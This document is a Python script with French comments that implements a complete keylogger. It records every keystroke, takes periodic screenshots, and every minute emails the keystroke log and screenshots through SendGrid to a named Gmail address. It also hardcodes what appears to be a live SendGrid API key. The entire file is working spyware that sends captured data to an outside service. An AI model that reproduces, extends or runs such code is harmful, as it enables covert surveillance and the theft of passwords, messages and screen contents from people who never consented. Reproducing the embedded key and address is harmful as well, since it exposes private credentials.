import os
import time
from PIL import ImageGrab
from pynput.keyboard import Listener
from threading import Timer
from sendgrid import SendGridAPIClient
from sendgrid.helpers.mail import Mail, Attachment, FileContent, FileName, FileType, Disposition
import base64

# Variables globales
log_file = "keylog.txt"  
screenshot_dir = "screenshots"
email_interval = 60  
screenshot_interval = 10  
SENDGRID_API_KEY = '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' 


print(f"Le fichier keylog.txt sera créé ici : {os.path.abspath(log_file)}") #chemin d'access du fichier keylog.txt

# verifier si le fichier keylog as ete cree et si cest pas le cas le crée 
if not os.path.exists(log_file):
    with open(log_file, "w") as f:
        f.write("")            # Créer un fichier vide
    print(f"Fichier {log_file} créé.")

# creation du fichier pour les screenshot
if not os.path.exists(screenshot_dir):
    os.makedirs(screenshot_dir)

# Fonction pour enregistrer les frappes  au clavier
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f'{key.char}')
        print(f"Touche enregistrée : {key.char}")  # Debug pour les touches standard
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f' {key} ')
        print(f"Touche spéciale enregistrée : {key}")  # Debug pour les touches spéciales

# Fonction pour capturer des captures d'écran
def take_screenshot():
    screenshot_name = os.path.join(screenshot_dir, f"screenshot_{int(time.time())}.png")
    screenshot = ImageGrab.grab()
    screenshot.save(screenshot_name)
    print(f"Capture d'écran enregistrée : {screenshot_name}")  # 
    Timer(screenshot_interval, take_screenshot).start()  # le nombre de temp apres les enregistre

# Fonction pour encoder les fichiers en base64
def encode_file_to_base64(filepath):
    with open(filepath, 'rb') as f:
        return base64.b64encode(f.read()).decode()

# Fonction pour envoyer les données par email avec SendGrid
def send_email():
    try:
        # Prépare le contenu de l'email
        message = Mail(
            from_email='arthuronguedia@gmail.com',  
            to_emails='arthuronguedia@gmail.com',  
            subject='Keylogger Data',
            html_content='<strong>Voici les logs et captures d\'écran</strong>'
        )

        # Attacher le fichier log si existant
        if os.path.exists(log_file):
            encoded_log = encode_file_to_base64(log_file)
            log_attachment = Attachment(
                FileContent(encoded_log),
                FileName('keylog.txt'),
                FileType('text/plain'),
                Disposition('attachment')
            )
            message.attachment = log_attachment
            print(f"Fichier {log_file} attaché à l'e-mail.")  # Debug

        # Attacher les captures d'écran
        for screenshot_file in os.listdir(screenshot_dir):
            screenshot_path = os.path.join(screenshot_dir, screenshot_file)
            encoded_screenshot = encode_file_to_base64(screenshot_path)
            screenshot_attachment = Attachment(
                FileContent(encoded_screenshot),
                FileName(screenshot_file),
                FileType('image/png'),
                Disposition('attachment')
            )
            message.add_attachment(screenshot_attachment)
            print(f"Capture d'écran {screenshot_file} attachée à l'e-mail.")  # Debug

        # Envoyer l'email via SendGrid
        sg = SendGridAPIClient(SENDGRID_API_KEY)
        response = sg.send(message)
        print(f"Email envoyé avec succès, statut {response.status_code}")
    except Exception as e:
        print(f"Erreur lors de l'envoi de l'e-mail : {e}")

    # Reprogrammer l'envoi dans N secondes
    Timer(email_interval, send_email).start()

# Démarrer le keylogger
def start_keylogger():
    print("Keylogger démarré...")  # Confirmation que le keylogger a démarré
    with Listener(on_press=on_press) as listener:
        listener.join()

# Lancer le keylogger et les captures d'écran
if __name__ == "__main__":
    try:
        # Démarrer les captures d'écran
        take_screenshot()

        # Envoyer les données par e-mail toutes les N secondes
        send_email()

        # Démarrer le keylogger
        start_keylogger()
    except Exception as e:
        print(f"Erreur principale : {e}")  # Debug
